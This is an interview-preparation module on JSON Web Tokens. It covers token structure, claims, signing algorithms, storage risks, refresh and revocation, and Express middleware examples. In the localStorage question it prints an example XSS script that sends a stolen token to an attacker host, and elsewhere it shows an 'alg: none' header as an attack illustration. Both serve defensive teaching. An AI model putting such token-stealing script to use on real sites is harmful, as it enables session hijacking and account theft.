# JSON Web Token (JWT) - Interview Questions & Answers

<!-- interview-module:v1 -->

> **How to use this interview module**
>
> **Practice:** Cover each answer, then explain it aloud in **60–120 seconds**. Add **one concrete example** from work or a lab.
>
> **Pair with:** the **Comprehensive Guide** and **Critical Clarification** for this topic (if present).

---

## **Fundamental Questions**

### **Q1: What is JWT and how does it work?**

**Answer:** JWT (JSON Web Token) is an open standard (RFC 7519) for securely transmitting information between parties as a JSON object. It's commonly used for authentication and authorization in web applications.

**JWT Structure:** A JWT consists of three parts separated by dots (`.`):

1. **Header**: Contains metadata about the token (algorithm, type)
2. **Payload**: Contains claims (user information, permissions, etc.)
3. **Signature**: Ensures token integrity and authenticity

**Format:**

```
header.payload.signature

```

**How it works:**

1. User authenticates with credentials
2. Server validates credentials and creates JWT
3. Server signs JWT with secret key
4. Server sends JWT to client
5. Client stores JWT and includes it in subsequent requests
6. Server verifies JWT signature and validates claims
7. Server grants/denies access based on token claims

**Example:**

```jsx
// Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload
{
  "userId": "123",
  "username": "john",
  "role": "admin",
  "exp": 1516242622
}

// Complete JWT
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJ1c2VybmFtZSI6ImpvaG4iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE1MTYyNDI2MjJ9.signature

```

---

### **Q2: What are the three parts of a JWT?**

**Answer:**

1. **Header**
    - Contains metadata about the token
    - Specifies algorithm (alg) and token type (typ)
    - Base64url encoded

    ```json
    {
      "alg": "HS256",
      "typ": "JWT"
    }

    ```

2. **Payload**
    - Contains claims (statements about the entity)
    - Can include registered claims (exp, iat, iss, aud) and custom claims
    - Base64url encoded (NOT encrypted!)

    ```json
    {
      "userId": "123",
      "username": "john",
      "role": "admin",
      "exp": 1516242622
    }

    ```

3. **Signature**
    - Created by signing the encoded header and payload
    - Ensures token hasn't been tampered with
    - Validates token authenticity

    ```
    HMACSHA256(
      base64UrlEncode(header) + "." + base64UrlEncode(payload),
      secret
    )

    ```

---

### **Q3: What is the difference between JWT encoding and encryption?**

**Answer:**

**Encoding (Base64url):**

- ✅ **Reversible**: Can be decoded by anyone
- ✅ **No security**: Not meant for hiding data
- ✅ **Purpose**: Makes data URL-safe for transmission
- ❌ **Anyone can decode**: Base64url is not encryption

**Encryption:**

- ✅ **Requires key**: Needs secret key to decrypt
- ✅ **Secure**: Hides data from unauthorized access
- ✅ **Purpose**: Protects sensitive information

**Key Point:** JWTs are **encoded**, NOT encrypted by default. Anyone can decode the payload and see its contents. If you need encryption, use **JWE (JSON Web Encryption)**.

**Example:**

```jsx
// JWT payload (encoded, NOT encrypted)
const token = "eyJ1c2VySWQiOiIxMjMifQ.signature";

// Anyone can decode this:
const decoded = atob(token.split('.')[1]);
// Result: {"userId":"123"} - readable by anyone!

```

---

### **Q4: What are JWT claims and what types exist?**

**Answer:**

Claims are statements about an entity (typically the user) and additional metadata. There are three types:

1. **Registered Claims** (Pre-defined in JWT spec):
    - `iss` (Issuer): Entity that issued the JWT
    - `sub` (Subject): Subject of the JWT (usually user ID)
    - `aud` (Audience): Intended recipient
    - `exp` (Expiration Time): Token expiration (Unix timestamp)
    - `nbf` (Not Before): Token not valid before this time
    - `iat` (Issued At): Time when token was issued
    - `jti` (JWT ID): Unique identifier for the JWT
2. **Public Claims** (Defined in JWT registry or as URIs):
    - `email`, `email_verified`, `name`, etc.
3. **Private Claims** (Custom claims specific to your application):
    - `userId`, `username`, `role`, `permissions`, etc.

**Example:**

```json
{
  "iss": "https://api.example.com",
  "sub": "1234567890",
  "aud": "my-app",
  "exp": 1516242622,
  "iat": 1516239022,
  "userId": "123",
  "role": "admin"
}

```

---

### **Q5: What are the different JWT signing algorithms?**

**Answer:**

1. **HMAC (Symmetric)**
    - **Algorithms**: HS256, HS384, HS512
    - **Full Name**: Hash-based Message Authentication Code
    - **How it works**: Same secret key for signing and verification
    - **Use case**: Single-server applications
    - **Pros**: Fast, simple
    - **Cons**: Secret key must be shared securely
2. **RSA (Asymmetric)**
    - **Algorithms**: RS256, RS384, RS512
    - **Full Name**: Rivest-Shamir-Adleman
    - **How it works**: Private key signs, public key verifies
    - **Use case**: Multi-server, microservices
    - **Pros**: Public key can be distributed widely
    - **Cons**: Slower than HMAC, requires key pair management
3. **ECDSA (Elliptic Curve)**
    - **Algorithms**: ES256, ES384, ES512
    - **Full Name**: Elliptic Curve Digital Signature Algorithm
    - **How it works**: Similar to RSA but uses elliptic curves
    - **Use case**: Modern apps, mobile, IoT
    - **Pros**: Smaller keys, faster than RSA
    - **Cons**: Requires key pair management

**Example:**

```jsx
// HMAC
const token = jwt.sign(payload, secretKey, { algorithm: 'HS256' });

// RSA
const token = jwt.sign(payload, privateKey, { algorithm: 'RS256' });
const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });

```

---

## **Security Questions**

### **Q6: Is JWT encrypted? Can sensitive data be stored in JWT?**

**Answer:**

**No, JWT is NOT encrypted by default.** JWTs are **base64url encoded**, which is NOT encryption. Anyone can decode the payload and see its contents.

**What this means:**

- ❌ **Never store sensitive information** in JWT payload
- ❌ Passwords, credit cards, SSN should NEVER be in JWT
- ❌ Personal identifiable information (PII) should be avoided
- ✅ Store only minimal identifiers needed for authorization

**Example:**

```jsx
// ❌ WRONG: Storing sensitive data
{
  "password": "hashed_password",  // Never!
  "creditCard": "1234-5678-9012-3456",  // Never!
  "ssn": "123-45-6789"  // Never!
}

// ✅ CORRECT: Only identifiers
{
  "userId": "123",
  "username": "john",
  "role": "admin"
}

```

**If you need encryption:** Use **JWE (JSON Web Encryption)** which encrypts the payload.

---

### **Q7: How do you protect against algorithm confusion attacks?**

**Answer:**

Algorithm confusion attacks occur when an attacker changes the algorithm in the header (e.g., to 'none' or a weak algorithm) to bypass signature validation.

**Protection:**

1. **Always whitelist algorithms explicitly**
2. **Never allow 'none' algorithm**
3. **Validate algorithm before verification**

**Example:**

```jsx
// ✅ CORRECT: Whitelist algorithms
jwt.verify(token, secret, {
  algorithms: ['HS256', 'RS256']  // Only these allowed
});

// ❌ WRONG: May allow 'none' or other algorithms
jwt.verify(token, secret);  // Dangerous!

```

**Why this matters:**

```jsx
// Attacker changes algorithm to 'none'
{
  "alg": "none",  // Changed from HS256
  "typ": "JWT"
}

// If server doesn't whitelist, attack succeeds

```

---

### **Q8: How do you prevent token theft and replay attacks?**

**Answer:**

**Token Theft Prevention:**

1. **Use httpOnly cookies** instead of localStorage (prevents XSS)
2. **Use HTTPS** for all token transmission
3. **Short token expiration** (15 minutes to 1 hour)
4. **Implement Content Security Policy (CSP)**
5. **Use SameSite cookie attribute**

**Replay Attack Prevention:**

1. **Short token expiration** (limits attack window)
2. **Use `jti` claim** (JWT ID) for one-time tokens
3. **Implement token blacklisting** (optional, requires storage)
4. **Use `nonce` for critical operations**

**Example:**

```jsx
// Short-lived access token
const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });

// With jti for one-time use
const payload = {
  userId: '123',
  jti: uuidv4(),  // Unique token ID
  exp: Math.floor(Date.now() / 1000) + 900  // 15 minutes
};

```

---

### **Q9: What happens if a JWT token is stolen?**

**Answer:**

If a JWT token is stolen, the attacker can use it until it expires because:

- JWT is stateless (no server-side revocation)
- Server can't distinguish between legitimate and stolen tokens
- Token remains valid until expiration

**Mitigation Strategies:**

1. **Short token expiration** (15 minutes to 1 hour)
2. **Token refresh mechanism** (short access token + long refresh token)
3. **Token blacklisting** (store revoked tokens, requires state)
4. **Monitor for suspicious activity** (unusual access patterns)
5. **Implement token rotation** (refresh tokens rotated on use)

**Best Practice:** Use **short-lived access tokens** (15 min) with **long-lived refresh tokens** (7 days) stored securely. If access token is stolen, damage is limited to 15 minutes.

---

### **Q10: How do you validate JWT expiration?**

**Answer:**

**Always validate expiration server-side** during token verification. Client-side checks can be bypassed.

**Correct Approach:**

```jsx
// ✅ CORRECT: Server-side validation with jwt.verify()
try {
  const decoded = jwt.verify(token, secret, {
    algorithms: ['HS256'],
    // jwt.verify() automatically validates 'exp' claim
  });
  // Token is valid and not expired
} catch (error) {
  if (error.name === 'TokenExpiredError') {
    // Token expired
  }
}

```

**Also validate other time claims:**

```jsx
jwt.verify(token, secret, {
  algorithms: ['HS256'],
  maxAge: '2h',        // Maximum age from 'iat'
  clockTolerance: 60   // Allow 60 seconds clock skew
});

```

**Wrong Approach:**

```jsx
// ❌ WRONG: Client-side check (can be bypassed)
const decoded = jwt.decode(token);  // No signature verification!
if (decoded.exp < Date.now() / 1000) {
  // Attacker can modify this check
}

```

---

### **Q11: What are the security risks of storing JWT in localStorage?**

**Answer:**

**Security Risks:**

1. **XSS Vulnerability**: JavaScript can access localStorage, making tokens vulnerable to XSS attacks
2. **No httpOnly Protection**: Unlike cookies, localStorage is accessible to JavaScript
3. **Persistence**: Tokens remain even after browser closes
4. **Domain-wide Access**: Any script on the same domain can access tokens

**Example Attack:**

```jsx
// XSS attack steals token from localStorage
<script>
  const token = localStorage.getItem('token');
  fetch('https://attacker.com/steal?token=' + token);
</script>

```

**Better Alternatives:**

1. **httpOnly Cookies** (most secure - not accessible to JavaScript)
2. **Memory Storage** (cleared on page refresh)
3. **Secure Storage** (Keychain on iOS, Keystore on Android for mobile apps)

---

## **Implementation Questions**

### **Q12: How do you create a JWT in Node.js?**

**Answer:**

Using the `jsonwebtoken` library:

```jsx
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

// Secret key (from environment variable)
const secret = process.env.JWT_SECRET || crypto.randomBytes(64).toString('hex');

// Payload
const payload = {
  userId: '123',
  username: 'john',
  role: 'admin',
  iat: Math.floor(Date.now() / 1000)
};

// Create token
const token = jwt.sign(payload, secret, {
  algorithm: 'HS256',
  expiresIn: '1h',
  issuer: 'my-api',
  audience: 'my-app'
});

console.log('Token:', token);

```

**Key Points:**

- Use environment variable for secret key
- Include expiration time
- Specify algorithm explicitly
- Include issuer and audience for validation

---

### **Q13: How do you verify a JWT in Node.js?**

**Answer:**

```jsx
const jwt = require('jsonwebtoken');

const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...';
const secret = process.env.JWT_SECRET;

try {
  // Verify and decode
  const decoded = jwt.verify(token, secret, {
    algorithms: ['HS256'],  // Whitelist algorithms
    issuer: 'my-api',       // Validate issuer
    audience: 'my-app',     // Validate audience
    maxAge: '2h'            // Maximum age
  });

  console.log('Decoded payload:', decoded);
  // Use decoded.userId, decoded.role, etc.

} catch (error) {
  if (error.name === 'TokenExpiredError') {
    console.error('Token has expired');
  } else if (error.name === 'JsonWebTokenError') {
    console.error('Invalid token');
  } else {
    console.error('Token verification failed:', error.message);
  }
}

```

**Important:**

- Always use `jwt.verify()` not `jwt.decode()` (verify validates signature)
- Whitelist algorithms explicitly
- Validate all claims (exp, iss, aud, etc.)
- Handle errors appropriately

---

### **Q14: How do you implement a JWT refresh token mechanism?**

**Answer:**

**Strategy:**

- Short-lived access token (15 minutes)
- Long-lived refresh token (7 days)
- Refresh token stored securely (httpOnly cookie)

**Implementation:**

```jsx
// Login - Issue both tokens
app.post('/login', (req, res) => {
  // Validate credentials...

  const payload = {
    userId: user.id,
    username: user.username,
    role: user.role
  };

  // Short-lived access token (15 minutes)
  const accessToken = jwt.sign(payload, secret, {
    algorithm: 'HS256',
    expiresIn: '15m',
    issuer: 'my-api',
    audience: 'my-app'
  });

  // Long-lived refresh token (7 days)
  const refreshToken = jwt.sign(
    { userId: user.id },
    secret,
    {
      algorithm: 'HS256',
      expiresIn: '7d',
      issuer: 'my-api'
    }
  );

  // Store refresh token in httpOnly cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
  });

  // Send access token
  res.json({ accessToken });
});

// Refresh endpoint
app.post('/refresh', (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }

  try {
    // Verify refresh token
    const decoded = jwt.verify(refreshToken, secret, {
      algorithms: ['HS256'],
      issuer: 'my-api'
    });

    // Create new access token
    const payload = {
      userId: decoded.userId,
      username: user.username,  // Fetch from database
      role: user.role
    };

    const accessToken = jwt.sign(payload, secret, {
      algorithm: 'HS256',
      expiresIn: '15m',
      issuer: 'my-api',
      audience: 'my-app'
    });

    res.json({ accessToken });
  } catch (error) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});

```

---

### **Q15: How do you implement JWT middleware for Express?**

**Answer:**

```jsx
const jwt = require('jsonwebtoken');

// Middleware function
const verifyToken = (req, res, next) => {
  // Get token from header or cookie
  const token = req.headers.authorization?.split(' ')[1] ||
                req.cookies.accessToken;

  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }

  try {
    // Verify token
    const decoded = jwt.verify(token, process.env.JWT_SECRET, {
      algorithms: ['HS256'],
      issuer: 'my-api',
      audience: 'my-app',
      maxAge: '2h'
    });

    // Attach user info to request object
    req.user = decoded;
    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired' });
    } else if (error.name === 'JsonWebTokenError') {
      return res.status(401).json({ error: 'Invalid token' });
    } else {
      return res.status(500).json({ error: 'Token verification failed' });
    }
  }
};

// Usage in routes
app.get('/protected', verifyToken, (req, res) => {
  res.json({
    message: 'Protected route',
    user: req.user
  });
});

// Optional: Role-based authorization middleware
const requireRole = (role) => {
  return (req, res, next) => {
    if (req.user.role !== role) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    next();
  };
};

app.get('/admin', verifyToken, requireRole('admin'), (req, res) => {
  res.json({ message: 'Admin only' });
});

```

---

## **Scenario-Based Questions**

### **Q16: How would you implement JWT authentication for a microservices architecture?**

**Answer:**

**Challenge:**

- Multiple services need to verify tokens
- Services don't share secrets
- Public key needs to be distributed

**Solution: Use Asymmetric Cryptography (RSA/ECDSA)**

```jsx
// Auth Service (Signs tokens with private key)
const jwt = require('jsonwebtoken');
const fs = require('fs');

const privateKey = fs.readFileSync('private.pem', 'utf8');

app.post('/login', (req, res) => {
  // Validate credentials...

  const payload = {
    userId: user.id,
    role: user.role
  };

  // Sign with private key
  const token = jwt.sign(payload, privateKey, {
    algorithm: 'RS256',
    expiresIn: '1h',
    issuer: 'auth-service'
  });

  res.json({ token });
});

// Other Services (Verify with public key)
const publicKey = fs.readFileSync('public.pem', 'utf8');

const verifyToken = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];

  try {
    const decoded = jwt.verify(token, publicKey, {
      algorithms: ['RS256'],
      issuer: 'auth-service'
    });

    req.user = decoded;
    next();
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
};

```

**Better Approach: JWKS (JSON Web Key Set)**

- Auth service exposes public keys via JWKS endpoint
- Services fetch public keys dynamically
- Supports key rotation

---

### **Q17: How would you handle JWT token revocation in a stateless system?**

**Answer:**

JWT revocation is challenging because JWTs are stateless. Here are approaches:

**1. Token Blacklist (Requires Storage)**

```jsx
// Redis or database to store blacklisted tokens
const blacklist = new Set();

// Revoke token
app.post('/logout', verifyToken, (req, res) => {
  blacklist.add(req.token);
  res.json({ message: 'Logged out' });
});

// Verify middleware
const verifyToken = (req, res, next) => {
  // ... verify token ...

  // Check blacklist
  if (blacklist.has(token)) {
    return res.status(401).json({ error: 'Token revoked' });
  }

  next();
};

```

**2. Short Token Expiration + Refresh Tokens**

- Use very short access tokens (5-15 minutes)
- Implement refresh tokens that can be revoked
- Limit damage window if token is stolen

**3. Versioned User Records**

```jsx
// Include user version in token
const payload = {
  userId: user.id,
  version: user.tokenVersion  // Increment on logout/password change
};

// Verify middleware checks version matches database

```

**4. Stateless Refresh Token Rotation**

- Rotate refresh tokens on each use
- Old refresh token becomes invalid
- Provides some revocation capability

**Best Practice:** Combine short expiration with refresh token rotation for most applications.

---

### **Q18: What are the trade-offs between using JWT and session cookies?**

**Answer:**

| Aspect | JWT | Session Cookies |
| --- | --- | --- |
| **State** | Stateless | Stateful (requires storage) |
| **Scalability** | ✅ Scales horizontally easily | ⚠️ Requires shared storage |
| **Token Size** | ⚠️ Larger (includes claims) | ✅ Smaller (just session ID) |
| **Storage** | Client-side | Server-side |
| **Revocation** | ❌ Difficult | ✅ Easy (delete session) |
| **XSS Protection** | ⚠️ If in localStorage | ✅ httpOnly cookies |
| **CSRF Protection** | ✅ Not sent automatically | ⚠️ Need SameSite attribute |
| **Performance** | ⚠️ Larger payload per request | ✅ Smaller payload |
| **Mobile Support** | ✅ Good | ⚠️ Limited |
| **Microservices** | ✅ Works well (asymmetric crypto) | ⚠️ Requires shared session store |

**When to Use JWT:**

- Stateless API architecture
- Microservices (with asymmetric crypto)
- Mobile applications
- Cross-domain authentication
- When you need claims in the token

**When to Use Sessions:**

- Traditional web applications
- Need easy token revocation
- Smaller payload size is important
- Single-server deployments

---

## **Advanced Questions**

### **Q19: What is JWE (JSON Web Encryption) and when would you use it?**

**Answer:**

**JWE (JSON Web Encryption)** is an extension to JWT that provides encryption of the payload, not just signature.

**JWT vs JWE:**

- **JWT**: Signed (integrity) but not encrypted (readable by anyone)
- **JWE**: Both signed and encrypted (payload is hidden)

**When to Use JWE:**

1. **Sensitive Data**: When payload must contain sensitive information
2. **Compliance**: When regulations require encryption (HIPAA, GDPR)
3. **High Security**: When data must be hidden from third parties
4. **Multi-party Systems**: When token passes through untrusted parties

**Example Use Case:**

- Healthcare applications storing patient IDs
- Financial applications with account information
- Government systems with classified data

**Trade-offs:**

- More complex implementation
- Larger token size
- Higher computational cost
- Requires key management for encryption

**For most applications:** Regular JWT with minimal claims is sufficient.

---

### **Q20: How do you handle JWT in a mobile application securely?**

**Answer:**

**Key Challenges:**

1. Secure token storage
2. Token transmission security
3. Token refresh handling

**Best Practices:**

**1. Secure Storage:**

```jsx
// iOS - Keychain
// Android - Keystore
// Use platform-specific secure storage APIs

// React Native example
import * as Keychain from 'react-native-keychain';

// Store token
await Keychain.setGenericPassword('token', jwtToken);

// Retrieve token
const credentials = await Keychain.getGenericPassword();
const token = credentials.password;

```

**2. HTTPS Only:**

- Always use HTTPS for API calls
- Implement certificate pinning for additional security

**3. Short Token Expiration:**

```jsx
// Short access token (15 minutes)
const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });

// Long refresh token (7-30 days) stored securely
const refreshToken = jwt.sign({ userId }, secret, { expiresIn: '7d' });

```

**4. Token Refresh:**

```jsx
// Intercept API calls
// If 401 error, refresh token automatically
// Retry original request with new token

```

**5. Biometric Authentication:**

- Use biometrics to unlock stored tokens
- Add additional security layer

**6. Token Deletion on App Uninstall:**

- Clear tokens when app is uninstalled
- Require re-authentication on fresh install

---

### **Q21: How do you implement JWT with role-based access control (RBAC)?**

**Answer:**

**1. Include Roles in Token:**

```jsx
const payload = {
  userId: user.id,
  username: user.username,
  roles: ['admin', 'editor'],  // Multiple roles
  permissions: ['read', 'write', 'delete']  // Direct permissions
};

```

**2. Create Authorization Middleware:**

```jsx
// Check if user has required role
const requireRole = (...allowedRoles) => {
  return (req, res, next) => {
    if (!req.user || !req.user.roles) {
      return res.status(401).json({ error: 'Unauthorized' });
    }

    const hasRole = req.user.roles.some(role => allowedRoles.includes(role));

    if (!hasRole) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }

    next();
  };
};

// Check if user has required permission
const requirePermission = (...requiredPermissions) => {
  return (req, res, next) => {
    if (!req.user || !req.user.permissions) {
      return res.status(401).json({ error: 'Unauthorized' });
    }

    const hasPermission = requiredPermissions.every(permission =>
      req.user.permissions.includes(permission)
    );

    if (!hasPermission) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }

    next();
  };
};

```

**3. Use in Routes:**

```jsx
// Admin only
app.delete('/users/:id', verifyToken, requireRole('admin'), deleteUser);

// Editor or Admin
app.put('/articles/:id', verifyToken, requireRole('admin', 'editor'), updateArticle);

// Permission-based
app.delete('/data', verifyToken, requirePermission('delete'), deleteData);

```

**4. Validate Claims Server-Side:**

```jsx
// Always validate roles/permissions server-side
// Never trust client-side validation
// Token claims are verified, but still validate in application logic

```

---

### **Q22: What is the difference between JWT and OAuth 2.0?**

**Answer:**

**JWT:**

- A **token format** (how data is structured)
- Can be used independently
- Defines structure (header.payload.signature)
- Can be used with or without OAuth

**OAuth 2.0:**

- An **authorization framework** (protocol for authorization)
- Defines how to obtain access tokens
- Specifies flows (Authorization Code, Client Credentials, etc.)
- Often uses JWT as the token format

**Relationship:**

- OAuth 2.0 often uses JWT as the access token format
- JWT can be used without OAuth (custom authentication)
- OAuth 2.0 can use other token formats (not just JWT)

**Example:**

```
OAuth 2.0 Flow:
1. User authorizes application
2. Application receives authorization code
3. Application exchanges code for access token (JWT format)
4. Application uses JWT to access protected resources

```

**When to Use What:**

- **JWT alone**: Simple authentication for your own application
- **OAuth 2.0 with JWT**: Third-party authentication, API authorization, SSO

---

## **Summary**

These questions cover fundamental concepts, security considerations, implementation details, and advanced scenarios. Key points to remember:

1. **JWTs are encoded, not encrypted** - don't store sensitive data
2. **Always validate all claims** including expiration
3. **Use algorithm whitelisting** - never allow 'none'
4. **Store tokens securely** - prefer httpOnly cookies
5. **Use short expiration times** with refresh tokens
6. **Validate server-side** - never trust client-side checks
7. **Follow security best practices** throughout implementation

Good luck with your interview!

---

## Depth: Interview follow-ups — JWT (JSON Web Token)

**Authoritative references (re-check periodically):** [OWASP JSON Web Token Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html); [RFC 7519](https://www.rfc-editor.org/rfc/rfc7519) (JWT); [RFC 8725](https://www.rfc-editor.org/rfc/rfc8725) (JSON Web Signature / JWT best practices—algorithm hygiene, key management).

**Follow-ups interviewers love:**
- **Algorithm confusion / `none`:** How does your stack reject `alg=none`, restrict allowed algs, and prevent RSA/HMAC confusion (use libs that implement RFC 8725 guidance)?
- **`kid` / JKU / x5u abuse:** If headers can steer verification keys, how do you pin trust to a known key set (no arbitrary URL fetches)?
- **Storage vs threat model:** Browser storage vs HttpOnly cookie—what XSS residual risk remains in each case?
- **Replay / rotation:** `jti`, token binding, short `exp`, refresh rotation—what breaks if the clock skews?

**Production verification:** Log verification failures without logging secrets; canary claims (`aud`, `iss`); monitor anomalous `sub`/`tenant` patterns.

**Cross-read:** OAuth, Cookie Security, TLS, XSS (this repo).

<!-- verified-depth-merged:v1 ids=jwt-json-web-token- -->

---

## Flagship Mock Question Ladder — JWT (JSON Web Token)

**Primary competency axis:** token validation, key management, claim semantics, session design.

### Junior (Fundamental clarity)

- What is JWT and what are its three parts?
- Why is JWT payload not confidential by default?
- Which claims must be validated before trusting a token?

### Senior (Design and trade-offs)

- How do you prevent RS256/HS256 algorithm confusion in implementation?
- How would you design key rotation with zero downtime?
- When should you choose opaque tokens over JWT for API access?

### Staff (Strategy and scale)

- Design multi-tenant JWT trust boundaries across many services.
- How do you enforce organization-wide issuer/audience policy safely?
- What telemetry proves your JWT controls are actually working?

### 10-minute mock drill format

- **3 min:** Pick one Junior prompt and answer with definition, mechanism, and one mitigation.
- **4 min:** Pick one Senior prompt and answer with trade-offs and implementation caveats.
- **3 min:** Pick one Staff prompt and answer with architecture/policy plus measurement plan.

### Answer quality rubric (quick score)

Score each answer from 0 to 2 for:

- **Accuracy** (facts and mechanism)
- **Depth** (trade-offs and failure modes)
- **Practicality** (implementable controls)
- **Verification** (tests/telemetry proving success)

**Interpretation:** `7-8/8` indicates strong interview-readiness for this topic.
